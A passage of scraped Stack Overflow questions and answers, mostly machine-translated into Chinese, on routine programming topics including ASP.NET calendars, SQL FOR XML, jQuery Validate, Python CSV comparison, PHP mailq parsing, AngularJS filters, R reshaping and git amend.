      var term = extractLast( this.value );
      if ( term.length < 2 ) {
        return false;
      }
    }, 
```

您可以将“2”更改为您想要的 minLength。

# asp.net - 将下一年/上一年按钮添加到 asp 日历控件

> ID：14379898
> 
> 赞同：6
> 
> 时间：2013-01-17T13:12:19.493
> 
> 标签：asp.net, controls

需要在 ASP 日历控件中动态添加上一年的按钮。

如何将它添加到现有的 next 和 prev 控件旁边？是否可以通过 dayrender 事件来做到这一点？请帮忙

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-01-17T13:30:06.223

试试下面...

```
<asp:Calendar ID="calender1" runat="server" VisibleDate="2012-10-10"></asp:Calendar>
<asp:Button ID="btnMNext" runat="server" Text="Next Month" />
<asp:Button ID="btnMPrev" runat="server" Text="Prev Month" />
<asp:Button ID="btnNextYr" runat="Server" Text="Next Year" />
<asp:Button ID="btnPrevYr" runat="server" Text="Prev Year" />
<br />
<asp:TextBox ID="txtcur" runat="server"></asp:TextBox> 
```

在后面的代码中

```
**btnMNext_Click**
String month;
month = calender1.SelectMonthText();
txtcur.Text = calender1.SelectedDate.ToShortDateString();
calender1.VisibleDate = calender1.VisibleDate.AddMonths(1);

**btnPrevYr_Click**
    calender1.VisibleDate = calender1.VisibleDate.AddYears(-1);

**btnNextYr_Click**
    calender1.VisibleDate = calender1.VisibleDate.AddYears(1);
End Sub

**btnMPrev_Click**
    calender1.VisibleDate = calender1.VisibleDate.AddMonths(-1); 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-01-17T13:46:10.740

不，您不能轻易修改现有日历。但也许在日历上方添加一个表格行就足够了，您可以在其中选择年份。

```
<table>
    <tr>
        <td>
            <asp:DropDownList id="drpCalMonth" Runat="Server" OnSelectedIndexChanged="Set_Calendar" AutoPostBack="true"></asp:DropDownList>
            <asp:DropDownList id="drpCalYear" Runat="Server" OnSelectedIndexChanged="Set_Calendar" AutoPostBack="true"></asp:DropDownList>
        </td>
    </tr>
    <tr>
        <td>
            <asp:Calendar id="cntCalendar" Runat="Server" Width="100%" />
        </td>
    </tr>
</table> 
```

以下是填充年月下拉列表的两种方法：

```
protected void Populate_MonthList()
{
    //Add each month to the list
    var dtf = System.Globalization.CultureInfo.CurrentCulture.DateTimeFormat;
    for(int i=1; i<=12; i++)
        drpCalMonth.Items.Add(new ListItem(dtf.GetMonthName(i), i.ToString()));

    //Make the current month selected item in the list
    drpCalMonth.Items.FindByValue(DateTime.Now.Month.ToString()).Selected = true;
}

protected void Populate_YearList()
{
    //Year list can be changed by changing the lower and upper 
    //limits of the For statement    
    for (int intYear = DateTime.Now.Year - 20; intYear <= DateTime.Now.Year + 20; intYear++)
    {
        drpCalYear.Items.Add(intYear.ToString());
    }

    //Make the current year selected item in the list
    drpCalYear.Items.FindByValue(DateTime.Now.Year.ToString()).Selected = true;
} 
```

您可以从以下位置初始化列表`Page_Load`：

```
protected void Page_Load(object sender, EventArgs e)
{
    if (!IsPostBack)
    {
        Populate_MonthList();
        Populate_YearList();
    }
} 
```

最后，这是设置新的`SelectedIndexChanged`事件的事件处理程序：`DropDownLists``Date`

```
protected void Set_Calendar(object Sender, EventArgs e)
{
    int year = int.Parse(drpCalYear.SelectedValue);
    int month = int.Parse(drpCalMonth.SelectedValue);
    cntCalendar.TodaysDate = new DateTime(year, month, 1);
} 
```

[测试]

灵感来自：[http](http://www.4guysfromrolla.com/articles/090104-1.aspx) ://www.4guysfromrolla.com/articles/090104-1.aspx (VB)

# sql - 别名 FOR XML PATH 结果

> ID：14379902
> 
> 赞同：10
> 
> 时间：2013-01-17T13:12:26.280
> 
> 标签：sql, sql-server, tsql

我想别名以下的输出：

```
-- Test table with some rubbish data
DECLARE @Test TABLE
(
    Names [varchar](20)
)
INSERT INTO @Test
SELECT 'Simon'

-- Query returns but with XML_<GUID> alias
SELECT 
    Names
FROM 
    @Test t 
FOR XML PATH ('Test') 
```

因此，为了论证，我想给它一个别名“Test”，而不是 XML_GUID 的列标题。我似乎无法得到它。有谁知道怎么做？我尝试从这里遵循一个示例：http: [//social.msdn.microsoft.com/Forums/nl/sqlxml/thread/1605c722-6388-40ff-9ab5-a3817a1db81f](http://social.msdn.microsoft.com/Forums/nl/sqlxml/thread/1605c722-6388-40ff-9ab5-a3817a1db81f)但我似乎无法让它返回。我总是遇到错误，说第 1 列没有名称。

任何帮助表示赞赏。

谢谢，

西蒙

* * *

## 回答 #1

> 赞同：16
> 
> 时间：2013-01-17T13:16:03.533

使其成为子查询：

```
select (
SELECT 
    Names
FROM 
    @Test t 
FOR XML PATH ('Test'),TYPE) as Test 
```

子查询产生值但从不提供列的名称。我还指定`,TYPE`了，否则它会强制转换为`varchar(max)`结果，而您可能希望将其保留为`xml`.

# android - 应用于文本的方法 canvas.rotate(90) 对于 android 4.0-4.1 已损坏

> ID：14379909
> 
> 赞同：3
> 
> 时间：2013-01-17T13:12:49.180
> 
> 标签：android, rotation, textview

我尝试使用 canvas.rotate() 方法使文本垂直。但是在 android 4.0 - 4.1 我得到了一个“跳舞的字母”，见截图。发生了什么，我该如何解决？请帮我。

4.0 - 4.1 结果：

![在此处输入图像描述](../Images/7eeb0eea0265b5c21aaa9c4b6f74d09b.png)

正常结果：

![在此处输入图像描述](../Images/81c853478357f6c1a31eeed64128a1a1.png)

这是代码

```
 @Override
    protected void onDraw(Canvas canvas) {
        super.onDraw(canvas);
        Paint textPaint = new Paint();
        textPaint.setColor(Color.WHITE);
        textPaint.setTextSize(30);
        canvas.rotate(90);
        canvas.drawText(text, 0, -getWidth()/2, textPaint);
        canvas.save();
        canvas.restore();
    } 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2015-10-11T17:51:06.837

简单地说，您可以尝试一下：

使用`textView`并设置`rotateAnimate`它和`setDuration`最小值并设置`setFillAfter(true)`如下：

```
 RotateAnimation rt = new RotateAnimation(0, 90,textView.getLayoutParams().width/2,textView.getLayoutParams().height/2);
  rt.setDuration(1);                
  rt.setFillAfter(true);
  textView.startAnimation(rt); 
```

很简单

# jquery - jQuery Validate 插件正在验证已“禁用”的字段

> ID：14379913
> 
> 赞同：1
> 
> 时间：2013-01-17T13:13:00.160
> 
> 标签：jquery, jquery-validate

如果将性别设置为 FEMALE，`gender?`我有一个字段，`is Pregnant?`

然后，如果`is Pregnant?`字段未得到答复，则将其标记为无效。

如果您返回并设置`gender?`为 MALE 验证仍然标记`is Pregnant?`为无效，即使它已经是`disabled`.

jQuery 说`disabled`字段被忽略。我什至尝试过： [jquery.validate 验证禁用字段](https://stackoverflow.com/questions/6403332/jquery-validate-validating-disabled-field)

```
ignore: ":hidden" 
```

我错过了什么？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-01-18T13:11:22.557

这是一个有效的问题，使用这个标记

```
<form>
<div>
    Male:
    <input type="radio" name="gender" value="male" />
    Female:
    <input type="radio" name="gender" value="female" /></div>
<br />
<div>
    Pregnant:
    <input type="radio" name="pregnant" value="yes" />
    Not Pregnant:
    <input type="radio" name="pregnant" value="no" /></div>
<br />
<input type="submit" />
</form> 
```

和这个脚本

```
$('[name=gender]').click(function () {
    var disabled = $(this).val() === 'male';
    $('[name=pregnant]').attr('disabled', disabled);

    // UNCOMMENT THIS TO FIX 
    // if ($('[name=pregnant]').hasClass('error')) {
    //    $('form').validate().form();
    // }
});

$('input').addClass('required');

$('form').validate({
    ignore: ":disabled",
    errorPlacement: function (error, element) {
        error.appendTo(element.parent("div"));
    },
    submitHandler: function () {
        alert('form is ok');
    }
}); 
```

重现问题：

*   点击女性
*   点击提交
*   错误信息显示 - 这是正确的
*   单击男性 - 错误消息仍然显示
*   点击提交 - 表格有效

所以正如@ioan 所说，您需要尝试摆脱此错误消息，因为它令人困惑，即使表单有效，错误消息仍然存在

*   问题 - [http://jsfiddle.net/YzCHJ/4/](http://jsfiddle.net/YzCHJ/4/)
*   一个可能的解决方案 - [http://jsfiddle.net/YzCHJ/5/](http://jsfiddle.net/YzCHJ/5/)

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-01-18T00:13:28.580

该`.validate()` `ignore:`选项的工作方式如下：

> **忽略**，默认值：`":hidden"`
> 验证时要忽略的元素，只需将它们过滤掉。使用了jQuery 的 not-method，因此**所有被接受的东西都`not()`可以**作为这个选项传递。

[http://docs.jquery.com/Plugins/Validation/validate#toptions](http://docs.jquery.com/Plugins/Validation/validate#toptions)

**工作演示：http:** [//jsfiddle.net/us9aE/](http://jsfiddle.net/us9aE/)

**HTML：**

```
<form id="myform">   
     <input type="text" name="field" disabled="disabled" /> <br/> 
</form> 
```

**jQuery：**

```
$(document).ready(function() {
    $('#myform').validate({
        ignore: ":disabled"
    });
}); 
```

如果您需要更具体的帮助，请展示您的相关 HTML、jQuery，并可选择创建一个 jsFiddle 演示。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-01-17T13:18:33.347

在验证阶段忽略禁用的字段但是如果验证阶段在字段被禁用之前开始起作用，则错误消息仍然存在。

您可以尝试通过清除验证错误并重新验证表单来简单地删除验证消息。

# android - 我想在平板电脑的选项按钮旁边添加按钮

> ID：14379919
> 
> 赞同：0
> 
> 时间：2013-01-17T13:13:18.617
> 
> 标签：android

我想在系统选项菜单旁边添加一些按钮，我该怎么做？

![在此处输入图像描述](../Images/eb760d2000a338fd72aa0d1fa9e45992.png)

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-01-17T13:17:32.780

尝试 [操作栏](http://developer.android.com/guide/topics/ui/actionbar.html)

[操作栏图标](http://developer.android.com/guide/practices/ui_guidelines/icon_design_action_bar.html)

```
@Override
    public boolean onCreateOptionsMenu(Menu menu) {
        android.view.MenuInflater inflater = getMenuInflater();
        inflater.inflate(R.menu.menu, menu);
        return super.onCreateOptionsMenu(menu);
    } 
```

菜单.xml

```
<menu xmlns:android="http://schemas.android.com/apk/res/android">
    <item android:id="@+id/save_button"
          android:title="i"
          android:showAsAction="always" />
</menu> 
```

# macos - 用于大量文件的 S3 GUI MacOS X 客户端

> ID：14379920
> 
> 赞同：3
> 
> 时间：2013-01-17T13:13:19.193
> 
> 标签：macos, amazon-web-services, amazon-s3, client

我正在寻找一个**MacOS X GUI AWS S3 客户端**来处理**大量文件的**列表并从中下载一些文件。

## 语境

我在一家公司工作，我们有一个基于云的产品，可以在 S3 上存储文件。我们的存储桶现在有数百万个文件。有时我需要能够列出这些存储桶并选择一些文件来帮助我调试我们的应用程序。由于列表很长，我想过滤它以便使用 MacOS X GUI 应用程序更轻松地浏览它。我希望能够下载一些文件，并且由于存储桶受到保护，它需要 HTTP 标头 AWS 签名。理想情况下，客户端会将存储桶视为只读，以防止出错。

## 问题

我在互联网上搜索了具有此类功能的 MacOS X 客户端，但它们都试图进行某种分层文件系统类比，而这种类比并不真正坚持 S3 API。在他们的类比中，他们有分隔符所在的文件夹的概念`/`。如果“文件夹”包含很多键，则浏览它需要列出所有键，或者某些客户端会在您向下滚动时列出更多键。

例如，我可能有数百万个以开头`data/`但只有少数以开头的键`data/555`（请注意，字符串不以`/`字符结尾，整个问题取决于这里）

## 解决方案

我正在考虑为 MacOS X（可能还有 Windows）编写一个 GUI 客户端，它使用S3 GET 存储桶列表的`prefix`和查询参数：`delimiter`

[http://docs.aws.amazon.com/AmazonS3/latest/API/RESTBucketGET.html](http://docs.aws.amazon.com/AmazonS3/latest/API/RESTBucketGET.html)

通常在前面的示例中，我会将前缀设置为`data/555`

我想知道我是否忽略了具有此类功能的 S3 GUI 客户端。

## 特征

*   MacOS X 的 GUI 客户端（即不是命令行：我需要非技术同事才能使用它）
*   列出具有任意`prefix`和`delimiter`查询参数过滤器的存储桶
*   能够从过滤列表中选择文件并下载它们
*   S3 授权（欢迎只管理一个 S3 帐户的客户）
*   理想情况下是只读客户端（不包含可以修改存储桶的代码）

在此先感谢您提供有关此问题的任何信息，

拉斐尔

# python - 比较 2 个 CSV 文件之间的值并写入第 3 个 CSV 文件

> ID：14379921
> 
> 赞同：3
> 
> 时间：2013-01-17T13:13:19.747
> 
> 标签：python, csv, python-2.7

我正在尝试比较 2 个 csv 之间特定列的值。我尝试了以下代码。但是，我没有得到任何输出，也没有错误。请在这件事上给予我帮助

```
with open("File1.csv", "rb") as in_file1, open("File2.csv", "rb") as in_file2,open("File3.csv", "wb") as out_file:
   reader1 = csv.reader(in_file1)
   reader2 = csv.reader(in_file2)
   writer = csv.writer(out_file)
   for row2 in reader2:
       for row1 in reader1:
           if row2[0] == row1[0]:
               row2[1] = row1[1]
       writer.writerow(row2) 
```

以下是数据的样子：

```
File 1

A 100
B 200
C 300
D 400
E 500

FIle 2

A
C
E
E
E
D

File 3 (Should be)

A 100
C 300
E 500
E 500
E 500
D 400 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-01-17T13:17:12.103

File1.csv 是一个映射。首先阅读它并将其存储在字典中。然后遍历 File2.csv 并将其与从映射字典中检索到的值一起写入 File3.csv。

以下代码适用于您的示例：

```
with open("File1.csv", "rb") as in_file1:
    d = dict(csv.reader(in_file1, delimiter=' '))

with open("File2.csv", "rb") as in_file2, open("File3.csv", "wb") as out_file:
    writer = csv.writer(out_file, delimiter=' ')
    for rec in csv.reader(in_file2, delimiter=' '):
        writer.writerow((rec[0], d[rec[0]])) 
```

只是为了说明，`d`看起来像这样：

```
{'A': '100', 'B': '200', 'C': '300', 'D': '400', 'E': '500'} 
```

这些值是字符串（不是整数），但这不是问题，因为我们只是将它们打印到文件中。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-01-17T13:25:50.580

为什么不简单地以这种方式使用它：

```
lookup = {}                                                                     
with open('file1', 'r') as f:                                                   
    lookup = dict([l.split() for l in f.read().split('\n') if len(l) > 0])         
with open('file2', 'r') as file2, open('out', 'w') as out:                      
    for line in file2.readlines():                                              
        line = line.strip()                                                     
        out.write("%s %s\n" % (line, lookup[line])) 
```

我在这里看不到使用 csv 的意义

# php - PHP getting the output of the command "mailq" to an array

> ID：14379933
> 
> 赞同：0
> 
> 时间：2013-01-17T13:13:51.553
> 
> 标签：php, regex, linux, arrays, postfix-mta

I'm having trouble with the executing the command `mailq` and turning it's output into values in a multidimensional array.

```
$results = array();

    exec('/usr/bin/mailq', $mailQresult);
    foreach ($mailQresult as $key => $mailqLine) {

        $res = preg_match('/^([A-Z0-9]{1,20})\s+([1-9][0-9]*)\s+((Mon|Tue|Wed|Thu|Fri|Sat|Sun)\s+[A-Za-z]{3}\s+[0-9]{2}\s+[0-9]{2}\:[0-9]{2}\:[0-9]{2})\s*$/', $mailqLine, $matches);
        if ($res) {
        // Insert message ID and other data into the object.
        // It will be competed afterwards.
        $mailqArray = array(
            'id' => $matches[1],
            'size' => intval($matches[2]),
            'date' => strftime($matches[3]),
            'sender' => $matches[5],
            'failed' => false,
            'recipients' => $matches[4]
            );
        }
    } 
```

The output of `mailq` includes white space and returns and looks a bit like this:

```
ID    SIZE DAYNAME MONTH DAY HOUR:MINUTES:SECONDS  sender@address.com [new line here]
(Host or domain name not found. Name service error for name=address.com type=MX: Host not found, try again) [new line here]
recipient@address.com 
```

so the the error message and the recipient end up in different keys.

I know that I could use shell_exec to get the output of mailq as one string but I have no idea then how to write the regular expression that will create a multidimensional array.

I might be approaching this wrong. Any advice is extremely welcome!

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-01-17T13:17:47.247

You could check the next item in the array to see if it contains a new messageid and other indicators. Probably a for loop instead of a foreach.

# javascript - 如何使用多个链接过滤 AngularJS 中的列表

> ID：14379934
> 
> 赞同：21
> 
> 时间：2013-01-17T13:13:51.757
> 
> 标签：javascript, html, filter, angularjs

我已经阅读了很多关于如何过滤列表的教程，但找不到我的简单用例的示例。

我有几个按钮，例如

```
<a href="#" id="filter-by-name">Name</a>
<a href="#" id="filter-by-age">Age</a>
<a href="#" id="filter-by-height">Height</a> 
```

我有`var persons = {...}`对象，我像这样显示它

```
<div ng-repeat="person in persons">
  {{person.name...}}
</div> 
```

**如何创建过滤器，以便每次单击其中一个按钮时列表都会被过滤？**

我尝试`ng-repeat="person in persons | filter:filterPersons"` 在脚本端添加和编写：

```
$scope.filterPersons(person){
  if (person.name == "John")
    return person;
} 
```

但这只是一个用例（如何用另一个名称过滤？） - 换句话说 -**如何将链接连接到过滤器？**

* * *

## 回答 #1

> 赞同：37
> 
> 时间：2013-01-17T14:21:38.833

您可以将过滤器绑定到范围变量，就像处理任何其他事情一样。因此，您只需在用户单击并将其绑定到`ng-repeat`过滤器参数时将适当的过滤器设置为范围。看：

```
<div ng-app>
  <span ng-click="myFilter = {type: 1}">Type 1</span> | 
  <span ng-click="myFilter = {type: 2}">Type 2</span> |
  <span ng-click="myFilter = null">No filter</span>
  <ul ng-controller="Test">
    <li ng-repeat="person in persons | filter:myFilter">{{person.name}}</li>
  </ul>
</div> 
```

```
function Test($scope) {
  $scope.persons = [{type: 1, name: 'Caio'}, {type:2, name: 'Ary'}, {type:1, name: 'Camila'}];
} 
```

请注意，`myFilter`当用户单击过滤器时，它会更改，并且它已绑定到`ng-repeat`过滤器。[在这里拉小提琴](http://jsfiddle.net/CaioToOn/pkxPa/)。您也可以创建一个新过滤器，但此解决方案要好得多。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2015-07-03T16:56:27.693

我的回答与Caio的非常相似。我只是想展示如何过滤掉现有的数组。

在我的 ng-repeat 中，我有一个通过单词的搜索过滤器。我希望标签查找字符串匹配。所以我添加了一个额外的过滤器

```
 <tr class="unEditableDrinks" ng-repeat="drink in unEditableDrinkList | orderBy:'-date'|limitTo:400|filter:search |filter:myFilter">
    <td>[[drink.name]]</td> 
```

我只有表的顶部，但这应该显示策略。名为 myFilter 的第二个过滤器附加到下面的按钮。

```
<div class="btn-group" role="group">
   <button type="button" class="btn btn-primary" ng-click="myFilter={name:'soda'}">Soda</button>
</div>
<div class="btn-group" role="group">
    <button type="button" class="btn btn-primary" ng-click="myFilter={name:'energy'}">Energy Drinks</button>
</div> 
```

在每个按钮上，我都可以添加一个 ng-click，它通过 myFilter 并使用drink.name 搜索 td。在每次 ng-click 中，我可以将 name 的值设置为 search。所以每一个含有苏打水或能量的标题都可以被过滤掉。

# shell - Environment variable not working in Cygwin

> ID：14379937
> 
> 赞同：1
> 
> 时间：2013-01-17T13:14:03.490
> 
> 标签：shell, variables, cygwin, environment

I have to run some shell scripts in Windows using Cygwin. I am able to achieve that using `%BASH% --login -i "/cygdrive/d/script.sh"`, where `%BASH%` is an environment variable in Windows set to `C:\cygwin\bin\bash.exe`.

The above script executes without any problem. But when there are Cygwin environment variables inside the .sh files then it doesn't work.

For example, I have a created a Cygwin environment variable `$EXE_PATH = /cygdrive/d/somepath/dir`. Inside my script the line is

```
$EXE_PATH/some.exe -f /cygdrive/d/password.txt 
```

There is error in this line every time I run the script. Error is something to do with the `some.exe/password.txt` not being found.

If I run the same command from the Cygwin terminal, it works fine. Is there something wrong with `/cygdrive`?

Here is the script

```
#!/bin/sh 
#TESTLEELA=/cygdrive/d 
echo simple shell script 

echo $EXE_PATH 

$EXE_PATH/runube.exe -f $TESTLEELA/password.txt DVRP910 *ALL R0006P XJDE0001 QBATCH B H S //NASRVNY1 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-01-17T13:38:43.563

换行

```
$EXE_PATH = /cygdrive/d/somepath/dir 
```

至

```
EXE_PATH=/cygdrive/d/somepath/dir   (in cygwin shell script) 
```

# rspec - 将更多信息附加到 RSpec 的默认失败消息？

> ID：14379941
> 
> 赞同：4
> 
> 时间：2013-01-17T13:14:16.227
> 
> 标签：rspec

我在这样的验证中测试了很多错误的字符串：

```
['0', '3:a', 'xx:11', '-1', '-3:00', 'h', 'h2', 'h2h', 'm', 'm10', 'm10m', '2hm', 'h2m', 'hm2', '2m10h', '2m10m', '2h10h'].each do |input|
  FactoryGirl.build(:time_record, duration_string: input).should have(1).error_on('duration_string'), "Tested value was '#{input}'"
end 
```

可悲的是，当其中一个失败时，消息`expected 1 error on :duration_string, got 0`并没有告诉我，哪一个失败了。我知道我可以传递显示的第二个参数，而不是像这样的默认消息：

```
x.should have(1).error_on('duration_string'), "Tested value was '#{input}'" 
```

但这隐藏了原始消息。有没有办法只将我自己的消息附加到原始消息而不是替换它？

谢谢你。

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2013-03-13T18:08:25.613

您可以使用另一条消息捕获并重新引发异常：

```
['0', '3:a', 'xx:11', '-1', '-3:00', 'h', 'h2', 'h2h', 'm', 'm10', 'm10m', '2hm', 'h2m', 'hm2', '2m10h', '2m10m', '2h10h'].each do |input|
  begin
    FactoryGirl.build(:time_record, duration_string: input).should  have(1).error_on('duration_string'), "Tested value was '#{input}'"
  rescue RSpec::Expectations::ExpectationNotMetError => e
    e.message << "failed at #{input}"
    raise e
  end
end 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-14T08:07:16.173

我是这样解决的：

```
['0', '3:a', 'xx:11', '-1', '-3:00', 'h', 'h2', 'h2h', 'm', 'm10', 'm10m', '2hm', 'h2m', 'hm2', '2m10h', '2m10m', '2h10h'].each do |input|
  it "does not accept #{input}" do
    FactoryGirl.build(:time_record, duration_string: input).should have(1).error_on('duration_string'), "Tested value was '#{input}'"
  end
end 
```

通过这种方式，您还可以廉价地获得更高规格的统计数据。;)

# r - 如何使用 reshape 包重塑我的数据框？

> ID：14379944
> 
> 赞同：0
> 
> 时间：2013-01-17T13:14:20.727
> 
> 标签：r, reshape

我有一个看起来像这样的数据框：

```
step  var1  score1  score2
1      a    0        0
2      b    1        1
3      d    1        1
4      e    0        0
5      g    0        0
1      b    1        1
2      a    1        0
3      d    1        0
4      e    0        1
5      f    1        1
1      g    0        1
2      d    1        1
etc. 
```

因为我只需要在第 5 步中将变量 ag（他们的分数在 score1 中）与 score2 关联起来，所以我认为我需要首先将我的数据集更改为：

```
a   b   c   d   e   f   g   score2_step5
0   1       1   0       0   0
1   1       1   0   1       1
            1           0 
etc. 
```

我很确定 Reshape 包应该能够帮助我完成这项工作，但我还不能让它工作。谁能帮我？提前谢谢了！

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-01-17T14:54:20.557

这是另一个版本。如果没有`step = 5`，则为 的值`score2_step = 0`。假设你`data.frame`是`df`：

```
require(reshape2)
out <- do.call(rbind, lapply(seq(1, nrow(df), by=5), function(ix) {
    iy <- min(ix+4, nrow(df))
    df.b <- df[ix:iy, ]
    tt <- dcast(df.b, 1 ~ var1, fill = 0, value.var = "score1", drop=F)
    tt$score2_step5 <- 0
    if (any(df.b$step == 5)) {
        tt$score2_step5 <- df.b$score2[df.b$step == 5]
    }
    tt[,-1]
}))

> out
   a b d e f g score2_step5
2  0 1 1 0 0 0            0
21 1 1 1 0 1 0            1
22 0 0 1 0 0 0            0 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-01-17T14:19:16.020

看起来您想要变量 ag 和 score2_step5 之间有 7 个相关性——对吗？首先，您将需要另一个变量。我假设`step`从 1 到 5 连续重复；如果没有，这将更加复杂。我假设您的数据被称为`df`. 我也更喜欢更新的`reshape2`包，所以我正在使用它。

```
df$block <- rep(1:(nrow(df)/5),each=5)
df.molten <- melt(df,id.vars=c("var1", "step", "block"),measure.vars=c("score1"))
df2 <- dcast(df.molten, block ~ var1)
score2_step5 <- df$score2[df$step==5] 
```

然后最后

```
cor(df2, score2_step5, use='pairwise') 
```

有一个额外的列 ( `block`) `df2`，您可以删除或忽略它。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-01-17T14:26:34.223

我在您的示例数据中添加了另一行，因为除非在每个块中都有第 5 步观察，否则我的代码将不起作用。

```
dat <- read.table(textConnection("
step  var1  score1  score2
1      a    0        0
2      b    1        1
3      d    1        1
4      e    0        0
5      g    0        0
1      b    1        1
2      a    1        0
3      d    1        0
4      e    0        1
5      f    1        1
1      g    0        1
2      d    1        1
5      a    1        0"),header=TRUE) 
```

像@JonathanChristensen 一样，我创建了另一个变量（我将其称为`rep`而不是`block`），并将`var1`其作为一个因子（因为给出的示例数据集中没有`c`值，我想要一个占位符）。

```
dat <- transform(dat,var1=factor(var1,levels=letters[1:7]),
                 rep=cumsum(step==1)) 
```

`tapply`制作`score1`值表：

```
tab <- with(dat,tapply(score1,list(rep,var1),identity)) 
```

添加`score2`, step-5 值：

```
data.frame(tab,subset(dat,step==5,select=score2)) 
```

# javascript - 省略分号会影响 JavaScript 的性能吗？

> ID：14379946
> 
> 赞同：21
> 
> 时间：2013-01-17T13:14:26.107
> 
> 标签：javascript

在查看一些代码片段时，我正在与一位同事讨论 JavaScript。我们注意到这些片段`;`在语句末尾缺少 。我们都知道即使在行尾没有显示分号，JS 也会被正确解释，但我想知道这是否会以某种方式影响评估的性能，因为它是一种解释型语言。

* * *

## 回答 #1

> 赞同：29
> 
> 时间：2013-01-17T13:21:22.910

带有空格、分号和注释的 javascript 文件比较重。这是主要影响。

但是你是一名编码员，你必须维护代码，所以这种非常轻微的影响远不如对可读性的不利影响重要。省略分号意味着你知道什么*时候*可以省略它们。但是规则并不是那么简单，学习它们不值得你花时间。

将分号留在原处，您将避免错误。

如果您想拥有尽可能轻的代码，请使用*压缩*器为浏览器构建更简洁的代码。这是它的职责，不是你的。

* * *

## 回答 #2

> 赞同：12
> 
> 时间：2013-01-17T13:34:17.490

在 JS 中省略分号是个大争论，但我们应该始终保留分号。如果你谈论性能，那么保留分号的好处将很少。

但事情并不止于此。除了性能之外，还有一件大事需要注意。

**[Doug Crockford 在此演示文稿](http://www.youtube.com/watch?v=hQVTIJBZook)中很好地解释了分号的需要：**

> JS 解释器发现一个错误，添加一个分号，然后再次运行整个过程。但并非每次他都将分号放在正确的位置，结果就是搞笑的错误。您应该始终使用分号并通过 JSLint 等测试工具运行您的 js。

除了这个分号之外，分号给代码更多的结构并使其更清晰 - 此外，它们的存在允许一些开发人员混淆他们的代码。

希望它会帮助你。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2013-01-17T13:21:10.617

代码语法的微小差异通常对代码的性能影响很小。解释一串代码的过程非常有效，只需要实际运行代码所花费的时间的一小部分。

低效的算法或额外的网络调用，例如拉入多个 .js 文件而不是单个文件会产生更大的影响。

# html - 不需要的字符出现将 URL 提供给图像

> ID：14379948
> 
> 赞同：0
> 
> 时间：2013-01-17T13:14:43.930
> 
> 标签：html, url, hyperlink

我有这个顺序的图像：[图像] [图像]

当我给他们每个人一个 url 时， - char 出乎意料地出现在他们之间。我不明白为什么 - 出现。

这是代码：

```
<div style='float:left;  width:320px;'>
                <span>
                     <a href='http://www.boun.edu.tr'/>
                     <img style='width:75px; height:75px' src='$img_root/logo_bogaz.jpg' alt='logo bogazici university'> 
                </span>
                <span>
                     <a href='http://www.gyte.edu.tr'/>
                     <img style='width:70px; height:70px' src='$img_root/gyte.gif'    alt='logo gyte'>  
                </span>
</div> 
```

和输出：

![在此处输入图像描述](../Images/c70f433ff381eec4f521334d674e2be3.png)

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-01-17T13:18:07.813

It is part of the underline from your anchor tag. You can remove the underline as per below. (Note this will remove it for all links)

Add this to fix:

```
<style>
a {
    text-decoration:none;
}
</style> 
```

Ideally this should go in a separate CSS file. But add it to the top of your HTML for an easy test.

# php - PHP中的strstr（）函数不起作用

> ID：14379954
> 
> 赞同：-2
> 
> 时间：2013-01-17T13:14:56.047
> 
> 标签：php, strstr

我在本地运行 PHP 5.3.8，在远程运行 5.2.17。

strstr() 在我的本地工作正常，但是在远程加载时它什么也不返回。甚至错误报告也没有说什么。

一个简单的使用它：

```
echo strstr('1234567890', '3', true); 
```

应该返回 12。而是什么都不给。在这一点上，我迷失了想法。两个相同的脚本如何返回不同的结果？

是不是偷偷关掉了？还是有我不知道的设置？非常感谢任何帮助，谢谢。

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2013-01-17T13:16:46.983

的第三个参数`strstr`是在 PHP 5.3.0 中引入的，因此您不能在具有 PHP 5.2.x 的远程服务器中使用此参数

链接在这里[http://php.net/manual/en/function.strstr.php](http://php.net/manual/en/function.strstr.php)（注意**更改日志**部分）

# git - 在原始分支提交、分支和修改是否安全？

> ID：14379962
> 
> 赞同：1
> 
> 时间：2013-01-17T13:15:13.960
> 
> 标签：git

在分支 A 提交，分支一个新的分支 B，在 A 处修改最后一次提交，将新的提交留给 B 是否安全？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-01-17T13:31:41.267

修改提交会更改该提交的标签。因此，分支 B 将有一个分支 A 没有的新提交，而分支 A 将有一个分支 B 在这种情况下没有的新提交。如果您通过简单的合并将分支 B 合并回 A，您在分支 A 中的登录将如下所示：

```
*    Merge from Branch B
|\  
| *  a change from Branch B
| *  commit related to xxx
* |  Amended commit related to xxx
|/  
*  Last commit before branching 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-01-17T13:17:13.527

如果您不打算将分支 B 合并到分支 A，那么您必须确保您在分支 A 中所做的更改也移动到分支 B，除非您冻结分支 B。

# android - 保存和检索 ArrayList

> ID：14379977
> 
> 赞同：0
> 
> 时间：2013-01-17T13:16:06.563
> 
> 标签：android, arraylist

我对 Android 非常陌生，我想做的是永久保存 2 个数组列表。上下文如下：用户将从列表视图中选择一个选项，应用程序将根据他选择的选项加载 2 个数组列表及其相应的数据。我已经探索了很多选项，例如使用 SharedPreferences 进行保存，但我不确定如何实现所讨论的方法。如果需要，将提供代码！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-01-17T13:22:00.383

[此链接](http://developer.android.com/guide/topics/data/data-storage.html)提供有关所有存储的信息，可在您的上下文中使用。还提供了代码示例。

我不认为 SharedPreferences 是您正在寻找的。我宁愿使用数据库（对于您的用例而言可能过大）或只是将文件保存到文件系统（也在链接中描述）。

